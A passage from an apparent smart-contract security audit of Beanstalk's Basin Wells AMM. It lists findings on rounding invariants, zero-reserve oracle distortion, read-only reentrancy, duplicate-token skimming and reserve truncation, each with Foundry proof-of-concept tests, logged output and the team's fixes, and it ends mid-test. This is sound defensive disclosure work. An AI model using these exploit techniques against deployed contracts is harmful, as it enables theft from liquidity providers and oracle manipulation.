**Recommended Mitigation:**
1. Add a rounding direction flag parameter to the `IWellFunction::calcReserve` and `IWellFunction::calcLpTokenSupply` functions. At all invocations of these functions, apply the correct rounding direction such that the transaction is processed favorably to the protocol.

2. Handle the last token separately in `Well::removeLiquidity`. In `Well::getRemoveLiquidityOut`, calculate the output token amount for the first `n-1` tokens as usual but use an approach similar to `Well::getRemoveLiquidityOneTokenOut` for the last token. This will help to have the invariant hold. We understand that another finding suggested adding a dedicated function to calculate the output token amount at the `IWellFunction` level. If the issue is mitigated that way, consider adding another check to ensure the invariant holds.

3. As we explained above, it is practically almost impossible to make the invariant `totalSupply() == calcLpTokenSupply(reserves)` hold strictly. We recommend a slightly looser invariant `totalSupply() >= calcLpTokenSupply(reserves)`, which can be interpreted as "the Well function underestimates the LP supply". Otherwise, we suggest adding another variable, `totalCalcSupply`, which will always reflect the calculated LP supply from the current `reserves`. This new variable can be used with `totalSupply()` together while deciding the output token amount. For example, in `Well::_getRemoveLiquidityOneTokenOut`, we can calculate `lpAmountInCalc = lpAmountIn * totalCalcSupply / totalSupply()` and use that in the function `_calcReserve`. This will be helpful because the discrepancy is reflected in the calculation.

Please note that `well.getReserves()[i] == wellFunction.calcReserve(i)` is also supposed to hold.
Because of the rounding in the calculation, we understand this invariant might be too strict and similar mitigation is recommended.
Below is a test to show that the above _invariant_ can be broken.
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {IERC20} from "test/TestHelper.sol";
import {IWellFunction} from "src/functions/ConstantProduct2.sol";
import {LiquidityHelper} from "test/LiquidityHelper.sol";
import "forge-std/Test.sol";
import {MockToken} from "mocks/tokens/MockToken.sol";

contract ReservesMathFunctionCalcReservesFail is LiquidityHelper {
    function setUp() public {
        setupWell(2);
    }

    function testReservesMismatchFail() public {
        // perform initial check
        uint[] memory reserves = well.getReserves();

        uint reserve0 =
            IWellFunction(wellFunction.target).calcReserve(reserves, 0, well.totalSupply(), wellFunction.data);
        uint reserve1 =
            IWellFunction(wellFunction.target).calcReserve(reserves, 1, well.totalSupply(), wellFunction.data);

        assertEq(reserves[0], reserve0);
        assertEq(reserves[1], reserve1);

        // swap
        address msgSender = address(2);
        changePrank(msgSender);
        uint tokenInIndex = 0;
        uint tokenOutIndex = 1;
        uint amountIn = 59_534_739_918_926_377_591_512_171_513;

        IERC20[] memory mockTokens = well.tokens();
        MockToken(address(mockTokens[tokenInIndex])).mint(msgSender, amountIn);
        // approve the well
        mockTokens[tokenInIndex].approve(address(well), amountIn);
        uint minAmountOut = well.getSwapOut(mockTokens[tokenInIndex], mockTokens[tokenOutIndex], amountIn);
        well.swapFrom(
            mockTokens[tokenInIndex], mockTokens[tokenOutIndex], amountIn, minAmountOut, msgSender, block.timestamp
        );

        // perform check again
        reserves = well.getReserves();

        reserve0 = IWellFunction(wellFunction.target).calcReserve(reserves, 0, well.totalSupply(), wellFunction.data);
        reserve1 = IWellFunction(wellFunction.target).calcReserve(reserves, 1, well.totalSupply(), wellFunction.data);

        assertEq(reserves[0], reserve0);
        assertEq(reserves[1], reserve1);
    }
}

```

**Beanstalk:**
1. `ConstantProduct2::_calcReserve` now rounds up instead of to the nearest number. `ConstantProduct2::_calcLpTokenSupply` still rounds down. The rationale is below. Fixed in commit [876da9a](https://github.com/BeanstalkFarms/Basin/pull/84/commits/876da9a8f0df4118a701299397b36065c8a92530).

    No rounding mode is necessary because `calcReserve` and `calcLpTokenSupply` should round the same direction in all cases:

    1. All instances of `calcReserve` should round up:
        * All output `amountIn` values are calculated by subtracting `_calcReserve(...) - reserveBefore`. The Well wants to overestimate `amountIn` to guarantee more tokens on the margin are sent to the Well. Thus, `_calcReserve` should round up. (See `swapTo`)
        * All output `amountOut` values are calculated by subtracting `reserveBefore - _calcReserve(...)`. The Well wants to underestimate `amountOut` so that less tokens are removed from the Well on the margin. Thus, `_calcReserve` should round up again. (See `swapFrom`, `shift`, `removeLiquidityOneToken`)
    2. All instances of `calcLpTokenSupply` should round down:
        * All `lpAmountIn` values are calculated by subtracting `totalSupply() - _calcLpTokenSupply(...)`. `lpAmountIn` should be overestimated and thus `_calcLpTokenSupply` should round down. (See `removeLiquidityImbalanced`)
        * All `lpAmountOut` values are calculated by subtracting `_calcLpTokenSupply(...) - totalSupply()`.  `lpAmountOut` values should be underestimated and thus `_calcLpTokenSupply` should round down.

    Given no rounding mode is necessaryIt is in fact up to the corresponding Well Function to decide how to round. The above rounding methods are only a suggestion and each Well Function is free to round however it wants.

2. The remediation for [H-03] added a `calcLPTokenUnderlying` function to `IWellFunction` to determine how much of each amount to remove when removing LP tokens. As a consequence, the Well Function itself now determines how many tokens to remove when LP is removed instead of the Well. Thus, the Well Function is free to define how to handle the `removeLiquidity` calculation and can ensure that it doesn't break its own defined invariant.

    Documentation has been added [here](https://github.com/BeanstalkFarms/Basin/commit/39ea396b0e78762cbeeee4e3fe8e343c2e114259) to indicate that a valid implementation of `calcLPTokenUnderlying` should never break a Well's invariant.

    Also, updated the `test_removeLiquidity_fuzz` test to include a check to test that the invariant holds after the `removeLiquidity` call [here](https://github.com/BeanstalkFarms/Basin/commit/f5d14eba5c9c7a02ed15eba675ed869916ea469d).

    Given that users should verify that a Well has a valid Well Function before interacting with a Well and protocols using Wells should keep a list of verified Well Functions, adding a check would just serve as an extra precaution in the case that an invalid Well Function is verified.,

    Adding the following check to `removeLiquidity`:

    ```solidity
    require(lpTokenSupply - lpAmountIn <= _calcLpTokenSupply(wellFunction(), reserves), "Well Function Invalid");
    ```

    increases the gas cost by 3,940. Given that the check only serves as an extra precaution, it doesn't seem like it is worth the extra gas cost to add. Therefore, the check has not been added.

3. The invariant that the Well is maintaining is `_calcLpTokenSupply(...) >= totalSupply()`. In order words, the Well issues fewer Well LP Tokens at the margin. This is to ensure that Well LP Tokens at least maintain their underlying value and dont get diluted.

    In order to help verify this, a `checkInvariant` function has been added to `TestHelper` which reverts if the above invariant does not hold. The `checkInvariant` function has been added to the majority of tests including `swapFrom`, `swapTo`, `removeLiquidity`, `removeLiquidityImbalanced`, `removeLiquidityOneToken`, and `addLiquidity`. Added in commit [876da9a](https://github.com/BeanstalkFarms/Basin/pull/84/commits/876da9a8f0df4118a701299397b36065c8a92530).

**Cyfrin:** Acknowledged and validated changes mitigate the original issue.


### Each Well is responsible for ensuring that an `update` call cannot be made with a reserve of 0

**Description:** The current implementation of `GeoEmaAndCumSmaPump` assumes each well will call `update()` with non-zero reserves, as commented at the beginning of the file:

```solidity
/**
 * @title GeoEmaAndCumSmaPump
 * @author Publius
 * @notice Stores a geometric EMA and cumulative geometric SMA for each reserve.
 * @dev A Pump designed for use in Beanstalk with 2 tokens.
 *
 * This Pump has 3 main features:
 *  1. Multi-block MEV resistence reserves
 *  2. MEV-resistant Geometric EMA intended for instantaneous reserve queries
 *  3. MEV-resistant Cumulative Geometric intended for SMA reserve queries
 *
 * Note: If an `update` call is made with a reserve of 0, the Geometric mean oracles will be set to 0.
 * Each Well is responsible for ensuring that an `update` call cannot be made with a reserve of 0.
 */
 ```

However, there is no actual requirement in `Well` to enforce pump updates with valid reserve values. Given that `GeoEmaAndCumSmaPump` restricts values to a minimum of 1 to prevent issues with the geometric mean, that the TWA values are not truly representative of the reserves in the Well, we believe it is worse than reverting in this case, although a `ConstantProduct2` Well can have zero reserves for either token via valid transactions.

```solidity
GeoEmaAndCumSmaPump.sol
103:         for (uint i; i < length; ++i) {
104:             // Use a minimum of 1 for reserve. Geometric means will be set to 0 if a reserve is 0.
105:             b.lastReserves[i] =
106:                 _capReserve(b.lastReserves[i], (reserves[i] > 0 ? reserves[i] : 1).fromUIntToLog2(), blocksPassed);
107:             b.emaReserves[i] = b.lastReserves[i].mul((ABDKMathQuad.ONE.sub(aN))).add(b.emaReserves[i].mul(aN));
108:             b.cumulativeReserves[i] = b.cumulativeReserves[i].add(b.lastReserves[i].mul(deltaTimestampBytes));
109:         }
```

**Impact:** Updating pumps with zero reserve values can lead to the distortion of critical states likely to be utilized for price oracles. Given that the issue is exploitable through valid transactions, we assess the severity as HIGH. It is crucial to note that attackers can exploit this vulnerability to manipulate the price oracle.

**Proof of Concept:** The test below shows that it is possible for reserves to be zero through valid transactions and updating pumps do not revert.

```solidity
function testUpdateCalledWithZero() public {
    address msgSender = 0x83a740c22a319FBEe5F2FaD0E8Cd0053dC711a1A;
    changePrank(msgSender);
    IERC20[] memory mockTokens = well.tokens();

    // add liquidity 1 on each side
    uint amount = 1;
    MockToken(address(mockTokens[0])).mint(msgSender, 1);
    MockToken(address(mockTokens[1])).mint(msgSender, 1);
    MockToken(address(mockTokens[0])).approve(address(well), amount);
    MockToken(address(mockTokens[1])).approve(address(well), amount);
    uint[] memory tokenAmountsIn = new uint[](2);
    tokenAmountsIn[0] = amount;
    tokenAmountsIn[1] = amount;
    uint minLpAmountOut = well.getAddLiquidityOut(tokenAmountsIn);
    well.addLiquidity(
        tokenAmountsIn,
        minLpAmountOut,
        msgSender,
        block.timestamp
    );

    // swaFromFeeOnTransfer from token1 to token0
    msgSender = 0xfFfFFffFffffFFffFffFFFFFFfFFFfFfFFfFfFfD;
    changePrank(msgSender);
    amount = 79_228_162_514_264_337_593_543_950_334;
    MockToken(address(mockTokens[1])).mint(msgSender, amount);
    MockToken(address(mockTokens[1])).approve(address(well), amount);
    uint minAmountOut = well.getSwapOut(
        mockTokens[1],
        mockTokens[0],
        amount
    );

    well.swapFromFeeOnTransfer(
        mockTokens[1],
        mockTokens[0],
        amount,
        minAmountOut,
        msgSender,
        block.timestamp
    );
    increaseTime(120);

    // remove liquidity one token
    msgSender = address(this);
    changePrank(msgSender);
    amount = 999_999_999_999_999_999_999_999_999;
    uint minTokenAmountOut = well.getRemoveLiquidityOneTokenOut(
        amount,
        mockTokens[1]
    );
    well.removeLiquidityOneToken(
        amount,
        mockTokens[1],
        minTokenAmountOut,
        msgSender,
        block.timestamp
    );

    msgSender = address(12_345_678);
    changePrank(msgSender);

    vm.warp(block.timestamp + 1);
    amount = 1;
    MockToken(address(mockTokens[0])).mint(msgSender, amount);
    MockToken(address(mockTokens[0])).approve(address(well), amount);
    uint amountOut = well.getSwapOut(mockTokens[0], mockTokens[1], amount);

    uint[] memory reserves = well.getReserves();
    assertEq(reserves[1], 0);

    // we are calling `_update` with reserves of 0, this should fail
    well.swapFrom(
        mockTokens[0],
        mockTokens[1],
        amount,
        amountOut,
        msgSender,
        block.timestamp
    );
}
```

**Recommended Mitigation:** Revert the pump updates if they are called with zero reserve values.

**Beanstalk:** Have decided not to implement the recommended remediation. This is due to several factors. First, there have been two changes made to the pump structure:
1) Have the Well not revert on Pump failure (commit [2459058](https://github.com/BeanstalkFarms/Basin/commit/2459058979a1aeb5e146adf399c68358d2857dd6)). This was implemented to protect the Well against Pump failure. Without this change, if the Pump breaks for some reason, the liquidity will be permanently locked as all Well actions will fail.
2) Dont initialize a Pump if any of the reserves are zero. This is to prevent the EMA and last balances from being initialized to zero. Instead, the Pump will just return and wait until it receives non-zero balances to initialize.

Due to 1), if the recommended remediation was implemented, then in the case where a balance of zero was passed in, the Well will continue to function, but the Pump will not be updated. Say a balance in the Well is 1e6, it is then set to 0 for an hour and then set back to 1e6. Because the Pump failed when the Well tried to update the Pump with the zero balance, it was not updated at all. Thus, the Pump will assume that the balance was 1e6 the whole time and not set to zero, which implies that the Pump is not an accurate measure of historical balances and could be manipulated (assuming the Well Function could use a balance of 0).

In addition, the difference between a balance of 1 and 0 is quite small. First, in neither case is the Well acting as a reliable source of price discovery. If there is only 1 micro-unit of an ERC-20 token in a Well, then there is essentially no bid to sell any more of that asset given the value of 1 micro-unit of an ERC-20 token is infinitesimal. For this reason, any protocol using the Pump should ensure that there is a sufficient balance of both ERC-20 tokens in the Well to ensure that it is an accurate source of price discovery. Therefore, the consequence of using a balance of 1 when the Pump intakes a balance of 0 should be minimal.

**Cyfrin:** Acknowledged.


### `removeLiquidity` logic is not correct for generalized Well functions other than ConstantProduct

**Description:** The protocol intends to provide a generalized framework for constant-function AMM liquidity pools where various Well functions can be used. Currently, only the constant-product type Well function is defined, but we understand that more general Well functions are intended to be supported.

The current implementation of `Well::removeLiquidity` and `Well::getRemoveLiquidityOut` assumes linearity while getting the output token amount from the LP token amount to withdraw. This holds well for the constant product type, as seen below. If we denote the total supply of LP tokens as $L$, the reserve values for the two tokens as $x, y$, and the invariant is $L^2=4xy$ for `ConstantProduct2`.
When removing liquidity of amount $l$, the output amounts are calculated as $\Delta x=\frac{l}{L}x, \Delta y=\frac{l}{L}y$. It is straightforward to verify that the invariant still holds after withdrawal, i.e., $(L-l)^2=(x-\Delta x)(y-\Delta y)$.

But in general, this kind of _linearity_ is not guaranteed to hold.

Recently, non-linear (quadratic) function AMMs have been introduced by some new protocols (see [Numoen](https://numoen.gitbook.io/numoen/)). If we use this kind of Well function, the current calculation of `tokenAmountsOut` will break the Well's invariant.

For your information, the Numoen protocol checks the protocol's invariant (the constant function itself) after every transaction.

**Impact:** The current `Well::removeLiquidity` logic assumes a specific condition on the Well function (linearity in some sense). This limits the generalization of the protocol as opposed to its original purpose. Given that this will lead to loss of funds for the liquidity providers for general Well functions, we evaluate the severity to HIGH.

**Proof of Concept:** We wrote a test case with the quadratic Well function used by Numoen.

```solidity
// QuadraticWell.sol

/**
 * SPDX-License-Identifier: MIT
 **/

pragma solidity ^0.8.17;

import "src/interfaces/IWellFunction.sol";
import "src/libraries/LibMath.sol";

contract QuadraticWell is IWellFunction {
    using LibMath for uint;

    uint constant PRECISION = 1e18; //@audit-info assume 1:1 upperbound for this well
    uint constant PRICE_BOUND = 1e18;

    /// @dev s = b_0 - (p_1^2 - b_1/2)^2
    function calcLpTokenSupply(
        uint[] calldata reserves,
        bytes calldata
    ) external override pure returns (uint lpTokenSupply) {
        uint delta = PRICE_BOUND - reserves[1] / 2;
        lpTokenSupply = reserves[0] - delta*delta/PRECISION ;
    }

    /// @dev b_0 = s + (p_1^2 - b_1/2)^2
    /// @dev b_1 = (p_1^2 - (b_0 - s)^(1/2))*2
    function calcReserve(
        uint[] calldata reserves,
        uint j,
        uint lpTokenSupply,
        bytes calldata
    ) external override pure returns (uint reserve) {

        if(j == 0)
        {
            uint delta = PRICE_BOUND*PRICE_BOUND - PRECISION*reserves[1]/2;
            return lpTokenSupply + delta*delta /PRECISION/PRECISION/PRECISION;
        }
        else {
            uint delta = (reserves[0] - lpTokenSupply)*PRECISION;
            return (PRICE_BOUND*PRICE_BOUND - delta.sqrt()*PRECISION)*2/PRECISION;
        }
    }

    function name() external override pure returns (string memory) {
        return "QuadraticWell";
    }

    function symbol() external override pure returns (string memory) {
        return "QW";
    }
}

// NOTE: Put in Exploit.t.sol
function test_exploitQuadraticWellAddRemoveLiquidity() public {
    MockQuadraticWell quadraticWell = new MockQuadraticWell();
    Call memory _wellFunction = Call(address(quadraticWell), "");
    Well well2 = Well(auger.bore("Well2", "WELL2", tokens, _wellFunction, pumps));

    approveMaxTokens(user, address(well2));
    uint[] memory amounts = new uint[](tokens.length);
    changePrank(user);

    // initial status 1:1
    amounts[0] = 1e18;
    amounts[1] = 1e18;
    well2.addLiquidity(amounts, 0, user); // state: [1 ether, 1 ether, 0.75 ether]

    Balances memory userBalances1 = getBalances(user, well2);
    uint[] memory userBalances = new uint[](3);
    userBalances[0] = userBalances1.tokens[0];
    userBalances[1] = userBalances1.tokens[1];
    userBalances[2] = userBalances1.lp;
    Balances memory wellBalances1 = getBalances(address(well2), well2);
    uint[] memory wellBalances = new uint[](3);
    wellBalances[0] = wellBalances1.tokens[0];
    wellBalances[1] = wellBalances1.tokens[1];
    wellBalances[2] = wellBalances1.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances1", userBalances);
    emit log_named_array("wellBalances1", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts));

    // addLiquidity
    amounts[0] = 2e18;
    amounts[1] = 1e18;
    well2.addLiquidity(amounts, 0, user); // state: [3 ether, 2 ether, 3 ether]

    Balances memory userBalances2 = getBalances(user, well2);
    userBalances[0] = userBalances2.tokens[0];
    userBalances[1] = userBalances2.tokens[1];
    userBalances[2] = userBalances2.lp;
    Balances memory wellBalances2 = getBalances(address(well2), well2);
    wellBalances[0] = wellBalances2.tokens[0];
    wellBalances[1] = wellBalances2.tokens[1];
    wellBalances[2] = wellBalances2.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances2", userBalances);
    emit log_named_array("wellBalances2", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts));

    // removeLiquidity
    amounts[0] = 0;
    amounts[1] = 0;
    well2.removeLiquidity(userBalances[2], amounts, user);

    Balances memory userBalances3 = getBalances(user, well2);
    userBalances[0] = userBalances3.tokens[0];
    userBalances[1] = userBalances3.tokens[1];
    userBalances[2] = userBalances3.lp;
    Balances memory wellBalances3 = getBalances(address(well2), well2);
    wellBalances[0] = wellBalances3.tokens[0];
    wellBalances[1] = wellBalances3.tokens[1];
    wellBalances[2] = wellBalances3.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances3", userBalances);
    emit log_named_array("wellBalances3", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts)); // @audit-info well's invariant is broken via normal removeLiquidity
}
```

The output is shown below. We calculated the `invariant` of the Well after transactions, and while it is supposed to stay at zero, it is broken after removing liquidity. Note that the invariant stayed zero on adding liquidity because the protocol explicitly calculates the resulting liquidity token supply using the Well function. However, the output amounts are calculated in a fixed manner when removing liquidity without using the Well function, which breaks the invariant.

```
forge test -vv --match-test test_exploitQuadraticWellAddRemoveLiquidity

[PASS] test_exploitQuadraticWellAddRemoveLiquidity() (gas: 4462244)
Logs:
  userBalances1: [999000000000000000000, 999000000000000000000, 750000000000000000]
  wellBalances1: [1000000000000000000, 1000000000000000000, 750000000000000000]
  invariant: 0
  userBalances2: [997000000000000000000, 998000000000000000000, 3000000000000000000]
  wellBalances2: [3000000000000000000, 2000000000000000000, 3000000000000000000]
  invariant: 0
  userBalances3: [1000000000000000000000, 1000000000000000000000, 0]
  wellBalances3: [0, 0, 0]
  invariant: 1000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 5.14ms
```

**Recommended Mitigation:** We believe it is impossible to cover all kinds of Well functions without adding some additional functions in the interface `IWellFunction`. We recommend adding a new function in the `IWellFunction` interface, possibly in the form of `function calcWithdrawFromLp(uint lpTokenToBurn) returns (uint reserve)`. The output token amount can be calculated using the newly added function.

**Beanstalk:** Added a `calcLPTokenUnderlying` function to `IWellFunction`. It returns the amount of each reserve token underlying a given amount of LP tokens. It is used to determine how many underlying tokens to send to a user when they remove liquidity using the `removeLiquidity` function. Fixed in commit [5271e9a](https://github.com/BeanstalkFarms/Basin/pull/57/commits/5271e9a454d1dd04848c3a7ce85f7d735a5858a0).

**Cyfrin:** Acknowledged.


### Read-only reentrancy

**Description:** The current implementation is vulnerable to read-only reentrancy, especially in [Wells::removeLiquidity](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L440).
The implementation does not strictly follow the [Checks-Effects-Interactions (CEI) pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) as it is setting the new reserve values after sending out the tokens. This is not an immediate risk to the protocol itself due to the `nonReentrant` modifier, but this is still vulnerable to [read-only reentrancy](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/).

Malicious attackers and unsuspecting ecosystem participants can deploy Wells with ERC-777 tokens (which have a callback that can take control) and exploit this vulnerability. This will lead to critical vulnerabilities given that the Wells are to be extended with price functions as defined by pumps - third-party protocols that integrate these on-chain oracles will be at risk.

Pumps are updated before token transfers; however, reserves are only set after. Therefore, pump functions will likely be incorrect on a re-entrant read-only call if `IWell(well).getReserves()` is called but reserves have not been correctly updated. The implementation of `GeoEmaAndCumSmaPump` appears not to be vulnerable, but given that each pump can choose its approach for recording a well's reserves over time, this remains a possible attack vector.

**Impact:** Although this is not an immediate risk to the protocol itself, read-only re-entrancy can lead to critical issues, so we evaluate the severity as HIGH.

**Proof of Concept:** We wrote a test case to show the existing read-only reentrancy.

```solidity
// MockCallbackRecipient.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {console} from "forge-std/Test.sol";

contract MockCallbackRecipient {
    fallback() external payable {
        console.log("here");
        (bool success, bytes memory result) = msg.sender.call(abi.encodeWithSignature("getReserves()"));
        if (success) {
            uint256[] memory reserves = abi.decode(result, (uint256[]));
            console.log("read-only-reentrancy beforeTokenTransfer reserves[0]: %s", reserves[0]);
            console.log("read-only-reentrancy beforeTokenTransfer reserves[1]: %s", reserves[1]);
        }
    }
}

// NOTE: Put in Exploit.t.sol
function test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() public {
    IERC20 callbackToken = IERC20(new MockCallbackToken("CallbackToken", "CBTKN", 18));
    MockToken(address(callbackToken)).mint(user, 1000e18);
    IERC20[] memory _tokens = new IERC20[](2);
    _tokens[0] = callbackToken;
    _tokens[1] = tokens[1];

    vm.stopPrank();
    Well well2 = Well(auger.bore("Well2", "WELL2", _tokens, wellFunction, pumps));
    approveMaxTokens(user, address(well2));

    uint[] memory amounts = new uint[](2);
    amounts[0] = 100 * 1e18;
    amounts[1] = 100 * 1e18;

    changePrank(user);
    callbackToken.approve(address(well2), type(uint).max);
    uint256 lpAmountOut = well2.addLiquidity(amounts, 0, user);

    well2.removeLiquidity(lpAmountOut, amounts, user);
}
```

The output is shown below.

```
forge test -vv --match-test test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken

[PASS] test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() (gas: 5290876)
Logs:
  read-only-reentrancy beforeTokenTransfer reserves[0]: 0
  read-only-reentrancy beforeTokenTransfer reserves[1]: 0
  read-only-reentrancy afterTokenTransfer reserves[0]: 0
  read-only-reentrancy afterTokenTransfer reserves[1]: 0
  read-only-reentrancy beforeTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy beforeTokenTransfer reserves[1]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[1]: 100000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 3.66ms
```

**Recommended Mitigation:** Implement the CEI pattern in relevant functions by updating reserves before making external calls. For example, the function `Well::removeLiquidity` can be modified shown below.

```solidity
function removeLiquidity(
    uint lpAmountIn,
    uint[] calldata minTokenAmountsOut,
    address recipient
) external nonReentrant returns (uint[] memory tokenAmountsOut) {
    IERC20[] memory _tokens = tokens();
    uint[] memory reserves = _updatePumps(_tokens.length);
    uint lpTokenSupply = totalSupply();

    tokenAmountsOut = new uint[](_tokens.length);
    _burn(msg.sender, lpAmountIn);

    _setReserves(reserves); // @audit CEI pattern

    for (uint i; i < _tokens.length; ++i) {
        tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply;
        require(
            tokenAmountsOut[i] >= minTokenAmountsOut[i],
            "Well: slippage"
        );
        _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);
        reserves[i] = reserves[i] - tokenAmountsOut[i];
    }

    emit RemoveLiquidity(lpAmountIn, tokenAmountsOut);
}
```

**Beanstalk:** Added a check to the `getReserves()` function that reverts if the Reentrancy guard has been entered. This prevents anyone from calling `getReserves()` while executing a function in the Well. Fixed in commit [fcbf04a](https://github.com/BeanstalkFarms/Basin/pull/85/commits/fcbf04a99b00807891fb2a9791ba18ed425479ab).

**Cyfrin:** Acknowledged.

\clearpage
## Medium Risk


### Should ensure uniqueness of the tokens of Wells

**Description:** The current implementation does not enforce uniqueness in the tokens of Wells.
Anyone can call `Aquifer::boreWell()` with malicious `Well` implementation to set up a trap for victims.
Through communication with the protocol team, it is understood that all Wells are considered _guilty until proven innocent_.
But it is still desirable to verify the Well on `Aquifier::boreWell` and prevent deployments of malicious Wells.
It is also strongly recommended to prohibit changing `tokens()` after the deployment.

If a Well has duplicate tokens, an attack path shown below exists, and there can be more.

**Impact:** While we assume users will be warned explicitly about malicious Wells and not likely to interact with invalid Wells, we evaluate the severity to MEDIUM.

**Proof of Concept:** Let us say tokens[0]=tokens[1].
An honest LP calls `addLiquidity([1 ether,1 ether], 200 ether, address)`, and the reserves will be (1 ether, 1 ether). But anyone can call `skim()` and take `1 ether` out. This is because `skimAmounts` relies on the `balanceOf()`, which will return `2 ether` for the first loop.

```solidity
function skim(address recipient) external nonReentrant returns (uint[] memory skimAmounts) {
    IERC20[] memory _tokens = tokens();
    uint[] memory reserves = _getReserves(_tokens.length);
    skimAmounts = new uint[](_tokens.length);
    for (uint i; i < _tokens.length; ++i) {
        skimAmounts[i] = _tokens[i].balanceOf(address(this)) - reserves[i];
        if (skimAmounts[i] > 0) {
            _tokens[i].safeTransfer(recipient, skimAmounts[i]);
        }
    }
}
```

**Recommended Mitigation:**
- Do not allow changing the Well tokens once deployed.
- Require the uniqueness of the tokens during `boreWell()`.

**Beanstalk:** Fixed in commit [f10e05a](https://github.com/BeanstalkFarms/Basin/pull/81/commits/f10e05a32f60ec288ef6064e665cae797b800b39).

**Cyfrin:** Acknowledged.


### `LibLastReserveBytes::storeLastReserves` has no check for reserves being too large

**Description:** After every liquidity event & swap, the `IPump::update`()` is called.
To update the pump, the `LibLastReserveBytes::storeLastReserves` function is used. This packs the reserve data into `bytes32` slots in storage.
A slot is then broken down into the following components:
- 1 byte for reserves array length
- 5 bytes for `timestamp`
- 16 bytes for each reserve balance

This adds to 22 bytes total, but the function also attempts to pack the second reserve balance in the `bytes32` object.
This would mean the `bytes32` would need 38 bytes total:

`1(length) + 5(timestamp) + 16(reserve balance 1) + 16(reserve balance 2) = 38 bytes`

To fit all this data into the `bytes32`, the function cuts off the last few bytes of the reserve balances using shift, as shown below.

```solidity
src\libraries\LibLastReserveBytes.sol
21:    uint8 n = uint8(reserves.length);
22:    if (n == 1) {
23:        assembly {
24:            sstore(slot, or(or(shl(208, lastTimestamp), shl(248, n)), shl(104, shr(152, mload(add(reserves, 32))))))
25:        }
26:        return;
27:    }
28:    assembly {
29:        sstore(
30:            slot,
31:            or(
32:                or(shl(208, lastTimestamp), shl(248, n)),
33:                or(shl(104, shr(152, mload(add(reserves, 32)))), shr(152, mload(add(reserves, 64))))
34:            )
35:        )
36:        // slot := add(slot, 32)
37:    }
```

So if the amount being stored is too large, the actual stored value will be different than what was expected to be stored.

On the other hand, the `LibBytes.sol` does seem to have a check:
```solidity
require(reserves[0] <= type(uint128).max, "ByteStorage: too large");
```
The `_setReserves` function calls this library after every reserve update in the well.
So in practice, with the currently implemented wells & pumps, this check would cause a revert.

However, a well that is implemented without this check could additionally trigger the pumps to cut off reserve data, meaning prices would be incorrect.

**Impact:** While we assume users will be explicitly warned about malicious Wells and are unlikely to interact with invalid Wells, we assess the severity to be MEDIUM.

**Proof of Concept:**
```solidity
function testStoreAndReadTwo() public {
    uint40 lastTimeStamp = 12345363;
    bytes16[] memory reserves = new bytes16[](2);
    reserves[0] = 0xffffffffffffffffffffffffffffffff; // This is too big!
    reserves[1] = 0x11111111111111111111111100000000;
    RESERVES_STORAGE_SLOT.storeLastReserves(lastTimeStamp, reserves);
    (
        uint8 n,
        uint40 _lastTimeStamp,
        bytes16[] memory _reserves
    ) = RESERVES_STORAGE_SLOT.readLastReserves();
    assertEq(2, n);
    assertEq(lastTimeStamp, _lastTimeStamp);
    assertEq(reserves[0], _reserves[0]); // This will fail
    assertEq(reserves[1], _reserves[1]);
    assertEq(reserves.length, _reserves.length);
}
```

**Recommended Mitigation:** We recommend adding a check on the size of reserves in `LibLastReseveBytes`.

Additionally, it is recommended to add comments to `LibLastReseveBytes` to inform users about the invariants of the system and how the max size of reserves should be equal to the max size of a `bytes16` and not a `uint256`.

**Beanstalk:** Because the Pump packs 2 last reserve values in the form of `bytes16` quadruple precision floating point values and a `uint40` timestamp into the same slot, there is a loss of precision on last reserve values. Each last reserve value only has precision of ~27 decimals instead of the expected ~34 decimals.

Given that the last reserves are only used to determine the cap on reserve updates and that the 27 decimals that are preserved are the most significant decimals, the impact due to this is minimal. The cap is only used to prevent the effect of manipulation, and is arbitrarily set. It is also never evaluated by external protocols. Finally, 27 decimal precision is still quite significant  If would need to be about 1,000,000,000,000,000,000,000,000,000 tokens in the pool for there to be an error of 1.

**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### TWAP is incorrect when only 1 update has occurred

**Description:** If there has only been a single update to the pump, `GeoEmaAndCumSmaPump::readTwaReserves` will return an incorrect value.

**Impact:** Given this affects only one oracle update when the pump is still ramping up, we evaluate the severity to LOW.

**Proof of Concept:**
```solidity
// NOTE: place in `Pump.Update.t.sol`
function testTWAReservesIsWrong() public {
    increaseTime(12); // increase 12 seconds

    bytes memory startCumulativeReserves = pump.readCumulativeReserves(
        address(mWell)
    );
    uint256 lastTimestamp = block.timestamp;
    increaseTime(120); // increase 120 seconds aka 10 blocks

    (uint[] memory twaReserves, ) = pump.readTwaReserves(
        address(mWell),
        startCumulativeReserves,
        lastTimestamp
    );

    assertApproxEqAbs(twaReserves[0], 1e6, 1);
    assertApproxEqAbs(twaReserves[1], 2e6, 1);

    vm.prank(user);
    // gonna double it
    // so our TWAP should now be ~1.5 & 3
    b[0] = 2e6;
    b[1] = 4e6;
    mWell.update(address(pump), b, new bytes(0));

    increaseTime(120); // increase 12 seconds aka 10 blocks
    (twaReserves, ) = pump.readTwaReserves(
        address(mWell),
        startCumulativeReserves,
        lastTimestamp
    );

    // the reserves of b[0]:
    // - 1e6 * 10 blocks
